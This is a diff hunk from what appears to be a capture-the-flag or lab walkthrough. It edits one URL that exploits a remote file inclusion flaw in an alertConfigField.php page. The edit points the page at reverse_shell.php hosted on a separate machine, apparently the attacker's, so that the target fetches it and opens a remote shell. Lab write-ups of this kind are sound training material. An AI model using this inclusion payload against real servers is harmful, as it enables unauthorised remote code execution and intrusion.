@@ -85,7 +85,7 @@ We visit the page and we are greeted by a picture:
 ![](../../img/Pasted%20image%2020220827204644.png)
 
 
-http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.68.81:80/reverse_shell.php?
+http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47:8080/reverse_shell.php?
 
 
 
